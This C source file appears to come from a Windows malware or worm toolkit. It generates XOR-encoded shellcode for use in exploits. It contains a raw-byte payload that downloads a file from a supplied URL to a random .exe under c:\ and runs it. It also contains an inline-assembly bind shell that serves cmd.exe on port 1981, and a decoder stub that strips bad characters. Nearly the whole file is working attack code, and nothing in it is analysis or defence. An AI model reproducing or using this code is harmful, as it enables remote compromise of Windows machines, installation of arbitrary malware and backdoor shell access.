

#include "main.h"
#include "shellcode.h"
#include "cstring.h"

char encoder[]=
	"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\x66\xB9\xFF\xFF"
	"\x80\x73\x0E\xFF\x43\xE2\xF9";

#define ENCODER_OFFSET_SIZE					14			// Offset for size of the encoder
#define ENCODER_OFFSET_XORKEY				19			// Offset for the xor key

char shellcode_udtf[]=
	"\xE9\x86\x00\x00\x00\x5B\xE8\x8D\x01\x00\x00\x8D\xB3\x04\x00"
	"\x00\x00\x8D\xBB\x0D\x00\x00\x00\xC7\x83\xA5\x00\x00\x00\x0F\x00"
	"\x00\x00\xE8\x1D\x01\x00\x00\x89\x83\x3C\x00\x00\x00\x8D\xBB\x1C"
	"\x00\x00\x00\xC7\x83\xA5\x00\x00\x00\x0D\x00\x00\x00\xE8\x02\x01"
	"\x00\x00\x89\x83\x38\x00\x00\x00\x8D\xBB\x29\x00\x00\x00\xE8\xE7"
	"\x00\x00\x00\x89\x83\x34\x00\x00\x00\x8D\xB3\x40\x00\x00\x00\x8D"
	"\xBB\x47\x00\x00\x00\xE8\xD0\x00\x00\x00\x89\x83\x5A\x00\x00\x00"
	"\x8D\xB3\x5E\x00\x00\x00\x8D\xBB\x65\x00\x00\x00\xE8\xB9\x00\x00"
	"\x00\x89\x83\x6C\x00\x00\x00\xE8\x78\x01\x00\x00\xE8\x75\xFF\xFF"
	"\xFF\x00\x00\x00\x00\x6B\x65\x72\x6E\x65\x6C\x33\x32\x00\x47\x65"
	"\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x00\x4C\x6F\x61"
	"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x45\x78\x69\x74\x54\x68"
	"\x72\x65\x61\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x75\x72\x6C\x6D\x6F\x6E\x00\x55\x52\x4C\x44\x6F\x77\x6E\x6C"
	"\x6F\x61\x64\x54\x6F\x46\x69\x6C\x65\x41\x00\x00\x00\x00\x00\x6D"
	"\x73\x76\x63\x72\x74\x00\x73\x79\x73\x74\x65\x6D\x00\x00\x00\x00"
	"\x00\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55"
	"\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55"
	"\x55\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x56\xFF\x53\x38\x57\x50"
	"\xFF\x53\x3C\xC3\x31\xD2\x89\xD0\xC1\xE0\x02\x8B\x8B\x9D\x00\x00"
	"\x00\x01\xC1\x8B\x01\x03\x83\x91\x00\x00\x00\x57\x56\x89\xFE\x89"
	"\xC7\x42\x8B\x8B\xA5\x00\x00\x00\xF3\xA6\x5E\x5F\x75\xD8\x4A\x89"
	"\xD0\xD1\xE0\x8B\x8B\xA1\x00\x00\x00\x01\xC1\x31\xC0\x66\x8B\x01"
	"\xC1\xE0\x02\x8B\x8B\x99\x00\x00\x00\x01\xC8\x8B\x08\x03\x8B\x91"
	"\x00\x00\x00\x89\xC8\xC3\x31\xC0\xC3\x64\xA1\x30\x00\x00\x00\x3E"
	"\x8B\x40\x0C\x3E\x8B\x70\x1C\xAD\x3E\x8B\x68\x08\x89\xAB\x91\x00"
	"\x00\x00\x89\xE8\x05\x3C\x00\x00\x00\x8B\x08\x03\x8B\x91\x00\x00"
	"\x00\x81\xC1\x78\x00\x00\x00\x8B\x31\x03\xB3\x91\x00\x00\x00\x81"
	"\xC6\x18\x00\x00\x00\xAD\x89\x83\x95\x00\x00\x00\xAD\x03\x83\x91"
	"\x00\x00\x00\x89\x83\x99\x00\x00\x00\xAD\x03\x83\x91\x00\x00\x00"
	"\x89\x83\x9D\x00\x00\x00\xAD\x03\x83\x91\x00\x00\x00\x89\x83\xA1"
	"\x00\x00\x00\xC3\xE9\x21\x00\x00\x00\x59\x31\xC0\x50\x50\x8D\x53"
	"\x70\x52\x8D\x91\x04\x00\x00\x00\x52\x50\xFF\x53\x5A\x8D\x53\x70"
	"\x52\xFF\x53\x6C\x31\xC0\x50\xFF\x53\x34\xE8\xDA\xFF\xFF\xFF\x00"
	"\x00\x00\x00\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55"
	"\x55\x55\x55\x00";

unsigned char szSubESP[] = { 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00 };

#define SHELLCODE_UDTF_OFFSET_FNAME	0x100 // Offset for the Filename
#define SHELLCODE_UDTF_OFFSET_URL	0x232 // Offset for the URL

bool contains(char *szBuf, int iSize, char cChar)
{	for(int i=0;i<iSize;i++) if(szBuf[i]==cChar) return true; return false; }

int setup_shellcode(char *szOrigShell, int iOrigShellSize, char *szShellBuf, \
						 int iShellBufSize, int iPort, int iHost, \
						 int iPortOffset, int iHostOffset, SCCallbackFunc pfnSC)
{	int iSCSize=iOrigShellSize, iEncoderSize=sizeof(encoder);
	int xorkey=0x98; iPort=htons(iPort);
	
	char *szPort=(char*)&iPort; char *szHost=(char*)&iHost;

	// Create local copies of the shellcode and encoder
	char *szShellCopy=(char*)malloc(iSCSize);
	memset(szShellCopy, 0, iSCSize); memcpy(szShellCopy, szOrigShell, iSCSize);
	char *szEncoderCopy=(char*)malloc(iEncoderSize);
	memset(szEncoderCopy, 0, iEncoderSize); memcpy(szEncoderCopy, encoder, iEncoderSize);
    
	szShellCopy[iPortOffset]=(char)szPort[0];	szShellCopy[iPortOffset+1]=(char)szPort[1];
	szShellCopy[iHostOffset]=(char)szHost[0];	szShellCopy[iHostOffset+1]=(char)szHost[1];
	szShellCopy[iHostOffset+2]=(char)szHost[2];	szShellCopy[iHostOffset+3]=(char)szHost[3];

	if(pfnSC) pfnSC(szShellCopy, iSCSize);

	char *szShellBackup=(char*)malloc(iSCSize);
	memset(szShellBackup, 0, iSCSize); memcpy(szShellBackup, szShellCopy, iSCSize);

	// Set the content size in the encoder copy
	char *szShellLength=(char*)&iSCSize;
	szEncoderCopy[ENCODER_OFFSET_SIZE]=(char)szShellLength[0];
	szEncoderCopy[ENCODER_OFFSET_SIZE+1]=(char)szShellLength[1];

	// XOR the shellcode while it contains 0x5C, 0x00, 0x0A or 0x0D
	while(	contains(szShellCopy, iSCSize, '\x5C') || contains(szShellCopy, iSCSize, '\x00') || \
			contains(szShellCopy, iSCSize, '\x0A') || contains(szShellCopy, iSCSize, '\x0D'))
	{	memcpy(szShellCopy, szShellBackup, iSCSize); xorkey++;
		for(int i=0;i<iSCSize;i++) szShellCopy[i]=szShellCopy[i]^xorkey;
		szEncoderCopy[ENCODER_OFFSET_XORKEY]=xorkey; }

	free(szShellBackup);

	// Clear the buffer with '\x00'
	memset(szShellBuf,			0,				iShellBufSize);	int iPos=0;
	// Append the encoder copy
	memcpy(szShellBuf+iPos,		szEncoderCopy,	iEncoderSize);	iPos+=iEncoderSize;
	// Append the shellcode copy
	memcpy(szShellBuf+iPos-1,	szShellCopy,	iSCSize);		iPos+=iSCSize;

	free(szEncoderCopy); free(szShellCopy);

	return iPos; }

int setup_shellcode_udtf(char *szShellBuf, int iShellBufSize, char *szURL, bool bStableESP, SCCallbackFunc pfnSC) {
	int iSCSize=sizeof(shellcode_udtf)-1+strlen(szURL)+1, iEncoderSize=sizeof(encoder);
	int xorkey=0x98;
	
	// Create local copies of the shellcode and encoder
	char *szShellCopy; if(bStableESP) {
		// Prepend sub esp, 0x1000 if needed
		szShellCopy=(char*)malloc(iSCSize+sizeof(szSubESP)); memset(szShellCopy, 0, iSCSize+sizeof(szSubESP));
		memcpy(szShellCopy, szSubESP, sizeof(szSubESP));
		memcpy(szShellCopy+sizeof(szSubESP), shellcode_udtf, iSCSize);
		iSCSize+=sizeof(szSubESP);
	} else {
		szShellCopy=(char*)malloc(iSCSize); memset(szShellCopy, 0, iSCSize);
		memcpy(szShellCopy, shellcode_udtf, iSCSize); }

	char *szEncoderCopy=(char*)malloc(iEncoderSize);
	memset(szEncoderCopy, 0, iEncoderSize); memcpy(szEncoderCopy, encoder, iEncoderSize);

	CString sFileName="c:\\"; srand(GetTickCount());
	for(int n=0;n<8;n++) sFileName.Format("%s%c", sFileName.CStr(), (rand()%26)+97);
	sFileName.Append(".exe");

	if(bStableESP) {
		memcpy(szShellCopy+SHELLCODE_UDTF_OFFSET_URL+sizeof(szSubESP), szURL, strlen(szURL)+1);
		memcpy(szShellCopy+SHELLCODE_UDTF_OFFSET_FNAME+sizeof(szSubESP), sFileName.CStr(), sFileName.GetLength()+1);
	} else {
		memcpy(szShellCopy+SHELLCODE_UDTF_OFFSET_URL, szURL, strlen(szURL)+1);
		memcpy(szShellCopy+SHELLCODE_UDTF_OFFSET_FNAME, sFileName.CStr(), sFileName.GetLength()+1);
	}

	if(pfnSC) pfnSC(szShellCopy, iSCSize);

	char *szShellBackup=(char*)malloc(iSCSize);
	memset(szShellBackup, 0, iSCSize); memcpy(szShellBackup, szShellCopy, iSCSize);

	// Set the content size in the encoder copy
	char *szShellLength=(char*)&iSCSize;
	szEncoderCopy[ENCODER_OFFSET_SIZE]=(char)szShellLength[0];
	szEncoderCopy[ENCODER_OFFSET_SIZE+1]=(char)szShellLength[1];

	// XOR the shellcode while it contains 0x5C, 0x00, 0x0A or 0x0D
	while(	contains(szShellCopy, iSCSize, '\x5C') || contains(szShellCopy, iSCSize, '\x00') || \
			contains(szShellCopy, iSCSize, '\x0A') || contains(szShellCopy, iSCSize, '\x0D'))
	{	memcpy(szShellCopy, szShellBackup, iSCSize); xorkey++;
		for(int i=0;i<iSCSize;i++) szShellCopy[i]=szShellCopy[i]^xorkey;
		szEncoderCopy[ENCODER_OFFSET_XORKEY]=xorkey; }

	free(szShellBackup);

	// Clear the buffer with '\x00'
	memset(szShellBuf,			0,				iShellBufSize);	int iPos=0;
	// Append the encoder copy
	memcpy(szShellBuf+iPos,		szEncoderCopy,	iEncoderSize);	iPos+=iEncoderSize;
	// Append the shellcode copy
	memcpy(szShellBuf+iPos-1,	szShellCopy,	iSCSize);		iPos+=iSCSize;

	free(szEncoderCopy); free(szShellCopy);

	return iPos; }

int encrypt_shellcode(char *szOrigShell, int iOrigShellSize, char *szShellBuf,
					  int iShellBufSize, SCCallbackFunc pfnSC)
{	int iSCSize=iOrigShellSize, iEncoderSize=sizeof(encoder); int xorkey=0x98;
	
	// Create local copies of the shellcode and encoder
	char *szShellCopy=(char*)malloc(iSCSize);
	memset(szShellCopy, 0, iSCSize); memcpy(szShellCopy, szOrigShell, iSCSize);
	char *szEncoderCopy=(char*)malloc(iEncoderSize);
	memset(szEncoderCopy, 0, iEncoderSize); memcpy(szEncoderCopy, encoder, iEncoderSize);
    
	if(pfnSC) pfnSC(szShellCopy, iSCSize);

	char *szShellBackup=(char*)malloc(iSCSize);
	memset(szShellBackup, 0, iSCSize); memcpy(szShellBackup, szShellCopy, iSCSize);

	// Set the content size in the encoder copy
	char *szShellLength=(char*)&iSCSize;
	szEncoderCopy[ENCODER_OFFSET_SIZE]=(char)szShellLength[0];
	szEncoderCopy[ENCODER_OFFSET_SIZE+1]=(char)szShellLength[1];

	// XOR the shellcode while it contains 0x5C, 0x00, 0x0A or 0x0D
	while(	contains(szShellCopy, iSCSize, '\x5C') || contains(szShellCopy, iSCSize, '\x00') || \
			contains(szShellCopy, iSCSize, '\x0A') || contains(szShellCopy, iSCSize, '\x0D'))
	{	memcpy(szShellCopy, szShellBackup, iSCSize); xorkey++;
		for(int i=0;i<iSCSize;i++) szShellCopy[i]=szShellCopy[i]^xorkey;
		szEncoderCopy[ENCODER_OFFSET_XORKEY]=xorkey; }

	free(szShellBackup);

	// Clear the buffer with '\x00'
	memset(szShellBuf,			0,				iShellBufSize);	int iPos=0;
	// Append the encoder copy
	memcpy(szShellBuf+iPos,		szEncoderCopy,	iEncoderSize);	iPos+=iEncoderSize;
	// Append the shellcode copy
	memcpy(szShellBuf+iPos-1,	szShellCopy,	iSCSize);		iPos+=iSCSize;

	free(szEncoderCopy); free(szShellCopy);

	return iPos; }

int Unicodify(const char *szIn, const unsigned long lInLen, char *szOut, const unsigned long lOutLen) {
	// Fail if the buffer is too small
	if(lOutLen<(lInLen*2)) return -1;

	// Loop to add a 0x00 after every value
	for(unsigned long l=0;l<lInLen;l++) {
		szOut[(l*2)]=szIn[l]; szOut[(l*2)+1]='\x00'; }

	return lOutLen; }

// sc_bind_1981 for 2k/xp/2003 v1.03.10.09 by ey4s
// thx to ey4s

#ifdef _WIN32
#pragma warning(disable:4731)
void shellcode_bind() {
	__asm {
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
	}

	__asm
	{
		pop		edi
		push	0x30
		pop		ebx
		mov		eax, fs:[ebx]
		mov		eax, [eax+0xc]
		mov		esi, [eax+0x1C]
		lods	dword ptr [esi]
		mov		ebp, [eax+8]
		push	4
		pop		ecx
get_kernel32_func_addr:
		call	locator_api_addr
		loop	get_kernel32_func_addr
		mov		ch, 3
		sub		esp, ecx
		push	0x3233						// "32"
		push	0x5F327377					// "ws2_"
		push	esp
		call	dword ptr [edi-8]			// LoadLibraryA
		xchg	eax, ebp
		push	5
		pop		ecx
get_ws2_32_func_addr:
		call	locator_api_addr
		loop	get_ws2_32_func_addr
		mov		esi, edi
	
		push	ecx							// ADDR_ANY 0
		push	0xBD070002					// 2=AF_INET 0x7BD=1981
		mov		ebp, esp
		
		// WSASocket
		push	ecx							// NULL
		push	ecx
		push	ecx
		push	ecx							// IPPROTO_IP 0
		push	1							// SOCK_STREAM
		push	2							// AF_INET
		call	dword ptr [esi-0x10]		// WSASocket
		xchg	eax, ebx
		
		// bind	
		push	0x10						// sizeof(sockaddr_in)
		push	ebp							// sockaddr_in address
		push	ebx							// socket
		call	dword ptr [esi-0xC]			// bind

		// listen
		push	eax
		push	ebx							// socket
		call	dword ptr [esi-0x8]			// listen
		//If no error occurs, listen returns zero.

		mov		edi, esp
		push	0xe
		pop		ecx
zero_si:
		stosd
		loop	zero_si

		//accept
		push	eax							// addr_len 0
		push	eax							// sockaddr 0
		push	ebx							// socket
		call	dword ptr [esi-0x4]			// accept

		stosd								// si.hStdInput
		stosd								// si.hStdOutput
		stosd								// si.hStdError
		mov		word ptr [esp+0x2c], 0x101	// dwFlags
		mov		edx, esp					// edx -> si

		push	0x00646D63					// 0x63='c' 0x6d='m' 0x64='d'
		mov		ecx,esp						// cmd

		push	ebx							// listen socket
		push	eax							// client socket

		//CreateProcessA
		push	edi							// pi
		push	edx							// si
		xor		ebx, ebx
		push	ebx							// lpCurrentDirectory
		push	ebx							// lpEnvironment
		push	ebx							// dwCreationFlags
		push	1							// bInheritHandles
		push	ebx							// lpThreadAttributes
		push	ebx							// lpProcessAttributes
		push	ecx							// lpCommandLine
		push	ebx							// lpApplicationName NULL
		call	dword ptr [esi-0x20]		// CreateProcessA
		push	0xffffffff
		push	[edi]						// pi.hProcess
		call	dword ptr [esi-0x24]		// WaitForSingleObject

		//closesocket
		call	dword ptr [esi-0x14]		// close client socket
		call	dword ptr [esi-0x14]		// close listen socket	
		//ExitThread
		call	dword ptr [esi-0x18]		// ExitThread
locator_api_addr:
		push	ecx
		mov		esi, dword ptr[ebp+3ch]		// e_lfanew
		mov		esi, dword ptr[esi+ebp+78h]	// Export Directory
		add		esi, ebp
		push	esi
		mov		esi, dword ptr[esi+20h]		// AddressOfNames
		add		esi, ebp

		xor		ecx, ecx					// index
		dec		ecx
next_dll_func:
		inc		ecx
		lods	dword ptr [esi]
		add		eax, ebp
		xor		ebx, ebx					// hash
		// make function name hash
next_byte:
		xor		edx, edx
		movsx	edx, [eax]
		cmp		dl,dh
		jz		func_cmp
		ror		ebx,27
		add		ebx,edx
		inc		eax
		jmp		next_byte
		// cmp func hash
func_cmp:
		cmp		ebx, [edi]					// cmp
		jnz		next_dll_func
		// found
		pop		esi
		mov		ebx, [esi+0x24]
		add		ebx, ebp
		mov		cx, word ptr[ebx+ecx*2]		// get func index?
		mov		ebx, [esi+0x1c]				// AddressOfFunctions;
		add		ebx, ebp
		mov		eax, dword ptr[ebx+ecx*4]
		add		eax, ebp
		stosd
		pop		ecx
		ret
	}
	
	__asm {
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
	}
	return; }

#define  FNENDLONG   0x08

unsigned char buff[100][128] = {
	// kernel32 (4)
	{ "WaitForSingleObject" },	// [edi-0x24]
	{ "CreateProcessA" },		// [edi-0x20]
	{ "LoadLibraryA" },			// [edi-0x1c]
	{ "ExitThread" },			// [edi-0x18]
	// ws2_32 (5)
	{ "closesocket" },			// [edi-0x14]
	{ "WSASocketA" },			// [edi-0x10]
	{ "bind" },					// [edi-0xC]
	{ "listen" },				// [edi-0x8]
	{ "accept" },				// [edi-0x4]
	{ "" } };

#define SHELLCODE_BIND_OFFSET_PORT 0x67

unsigned long hash(char *c) { unsigned long h=0; while(*c) h=((h<<5)|(h>>27))+*c++; return h; }

int setup_shellcode_bind(char *szShellBuf, int iShellBufSize, unsigned short sPort, bool bStableESP, SCCallbackFunc pfnSC) {
	unsigned char	 temp, *shellcodefnadd, *start, sc[0x1000];
	int				 k, all, i, j;
	char			*fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	unsigned long	 lHashSize, lHash[100], hashNum, lSCSize;
	unsigned short	 sPortN=htons(sPort);

	for(i=0;;i++) { if(!buff[i][0]) break; lHash[i]=hash((char*)buff[i]); }
	hashNum=i; lHashSize=hashNum*4;

	memset(sc, 0, sizeof(sc)); shellcodefnadd=(unsigned char*)shellcode_bind;
	temp=*shellcodefnadd; if(temp==0xe9) { ++shellcodefnadd; k=*(int*)shellcodefnadd; shellcodefnadd+=k; shellcodefnadd+=4; }
	for(k=0; k<=0x500; ++k) if(!memcmp(shellcodefnadd+k, fnendstr, FNENDLONG)) break;
	start=shellcodefnadd+k+8; for(k=0; k<=0x500; ++k) if(!memcmp(start+k,fnendstr,FNENDLONG)) break;
	all=k+lHashSize+5; lSCSize=all; sc[0]='\xe8';
	memcpy(&sc[1], &lHashSize, 4);
	memcpy(&sc[5], (char *)&lHash, lHashSize);
	memcpy(&sc[5+lHashSize], start, k);
	
	*(unsigned short*)(&sc[SHELLCODE_BIND_OFFSET_PORT])=sPortN;

	int iSCSize=lSCSize+1, iEncoderSize=sizeof(encoder);
	int xorkey=0x98;
	
	// Create local copies of the shellcode and encoder
	char *szShellCopy; if(bStableESP) {
		// Prepend sub esp, 0x1000 if needed
		szShellCopy=(char*)malloc(iSCSize+sizeof(szSubESP)); memset(szShellCopy, 0, iSCSize+sizeof(szSubESP));
		memcpy(szShellCopy, szSubESP, sizeof(szSubESP));
		memcpy(szShellCopy+sizeof(szSubESP), sc, iSCSize);
		iSCSize+=sizeof(szSubESP);
	} else {
		szShellCopy=(char*)malloc(iSCSize); memset(szShellCopy, 0, iSCSize);
		memcpy(szShellCopy, sc, iSCSize); }

	char *szEncoderCopy=(char*)malloc(iEncoderSize);
	memset(szEncoderCopy, 0, iEncoderSize); memcpy(szEncoderCopy, encoder, iEncoderSize);

	if(pfnSC) pfnSC(szShellCopy, iSCSize);

	char *szShellBackup=(char*)malloc(iSCSize);
	memset(szShellBackup, 0, iSCSize); memcpy(szShellBackup, szShellCopy, iSCSize);

	// Set the content size in the encoder copy
	char *szShellLength=(char*)&iSCSize;
	szEncoderCopy[ENCODER_OFFSET_SIZE]=(char)szShellLength[0];
	szEncoderCopy[ENCODER_OFFSET_SIZE+1]=(char)szShellLength[1];

	// XOR the shellcode while it contains 0x5C, 0x00, 0x0A or 0x0D
	while(	contains(szShellCopy, iSCSize, '\x5C') || contains(szShellCopy, iSCSize, '\x00') || \
			contains(szShellCopy, iSCSize, '\x0A') || contains(szShellCopy, iSCSize, '\x0D'))
	{	memcpy(szShellCopy, szShellBackup, iSCSize); xorkey++;
		for(int i=0;i<iSCSize;i++) szShellCopy[i]=szShellCopy[i]^xorkey;
		szEncoderCopy[ENCODER_OFFSET_XORKEY]=xorkey; }

	free(szShellBackup);

	// Clear the buffer with '\x00'
	memset(szShellBuf,			0,				iShellBufSize);	int iPos=0;
	// Append the encoder copy
	memcpy(szShellBuf+iPos,		szEncoderCopy,	iEncoderSize);	iPos+=iEncoderSize;
	// Append the shellcode copy
	memcpy(szShellBuf+iPos-1,	szShellCopy,	iSCSize);		iPos+=iSCSize;

	free(szEncoderCopy); free(szShellCopy);

	return iPos; }

#endif // _WIN32
